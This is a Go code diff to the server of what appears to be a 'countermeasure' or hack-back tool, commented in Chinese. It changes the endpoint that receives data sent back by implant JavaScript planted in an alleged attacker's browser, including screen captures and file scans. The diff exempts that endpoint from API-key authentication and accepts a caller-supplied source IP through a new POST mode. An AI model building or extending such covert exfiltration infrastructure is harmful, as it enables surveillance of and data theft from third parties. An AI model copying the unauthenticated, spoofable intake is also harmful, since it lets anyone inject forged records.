@@ -195,8 +195,9 @@ func (s *Server) apiKeyMiddleware(next http.Handler) http.Handler {
 
 		path := r.URL.Path
 
-		// 豁免端点：健康检查、指纹采集、SSE 推送
-		if path == "/healthz" || strings.HasPrefix(path, "/api/collect") || path == "/api/events" {
+		// 豁免端点：健康检查、指纹采集、SSE 推送、反制数据外传
+		// /api/countermeasure/exfil 由攻击者浏览器中的植入体JS触发，不可拦截
+		if path == "/healthz" || strings.HasPrefix(path, "/api/collect") || path == "/api/events" || path == "/api/countermeasure/exfil" {
 			next.ServeHTTP(w, r)
 			return
 		}
@@ -780,7 +781,9 @@ func (s *Server) handleAgentGenerate(w http.ResponseWriter, r *http.Request) {
 // ============================================================
 
 // handleCountermeasureExfil 接收植入体加密回传数据
-// 支持分片重组（Image Beacon 分片回传）
+// 支持两种模式：
+//   - GET + Query Params: Image Beacon 分片回传（植入体JS使用）
+//   - POST + JSON Body: 结构化数据回传（测试/管理API使用）
 func (s *Server) handleCountermeasureExfil(w http.ResponseWriter, r *http.Request) {
 	if s.traceEngine == nil {
 		writeJSON(w, http.StatusServiceUnavailable, map[string]string{"error": "trace engine not available"})
@@ -792,22 +795,52 @@ func (s *Server) handleCountermeasureExfil(w http.ResponseWriter, r *http.Reques
 		remoteIP = fwd
 	}
 
-	data := r.URL.Query().Get("d")
-	offset := r.URL.Query().Get("s")
-	total := r.URL.Query().Get("t")
-	dataType := r.URL.Query().Get("tt")
+	var (
+		data     string
+		dataType string
+	)
 
-	if data == "" {
-		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "missing data"})
-		return
-	}
+	// POST JSON 模式：从请求体解析结构化数据
+	if r.Method == http.MethodPost {
+		var body struct {
+			Type     string                 `json:"type"`
+			TargetIP string                 `json:"target_ip"`
+			Data     map[string]interface{} `json:"data"`
+			DataType string                 `json:"data_type"`
+		}
+		if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
+			writeJSON(w, http.StatusBadRequest, map[string]string{"error": "invalid JSON body"})
+			return
+		}
+		if body.TargetIP != "" {
+			remoteIP = body.TargetIP
+		}
+		dataType = body.DataType
+		if dataType == "" {
+			dataType = body.Type
+		}
+		// 将 JSON body 序列化为 data 字符串用于日志/审计
+		if jsonBytes, err := json.Marshal(body.Data); err == nil {
+			data = string(jsonBytes)
+		}
+	} else {
+		// GET Image Beacon 模式：从查询参数解析
+		data = r.URL.Query().Get("d")
+		offset := r.URL.Query().Get("s")
+		total := r.URL.Query().Get("t")
+		dataType = r.URL.Query().Get("tt")
 
-	// 分片重组逻辑
-	if offset != "" && total != "" {
-		// 存储分片，等全部到达后组装
-		s.logger.Debugw("exfil chunk received", "ip", remoteIP, "offset", offset, "total", total, "type", dataType)
-		writeJSON(w, http.StatusOK, map[string]string{"status": "chunk_received"})
-		return
+		if data == "" {
+			writeJSON(w, http.StatusBadRequest, map[string]string{"error": "missing data"})
+			return
+		}
+
+		// 分片重组逻辑
+		if offset != "" && total != "" {
+			s.logger.Debugw("exfil chunk received", "ip", remoteIP, "offset", offset, "total", total, "type", dataType)
+			writeJSON(w, http.StatusOK, map[string]string{"status": "chunk_received"})
+			return
+		}
 	}
 
 	s.logger.Infow("countermeasure exfil received",
@@ -819,7 +852,7 @@ func (s *Server) handleCountermeasureExfil(w http.ResponseWriter, r *http.Reques
 
 	var opType countermeasure.OpType
 	switch dataType {
-	case "screen_cap":
+	case "screen_capture", "screen_cap":
 		opType = countermeasure.OpScreenCapture
 	case "file_scan":
 		opType = countermeasure.OpFileScan
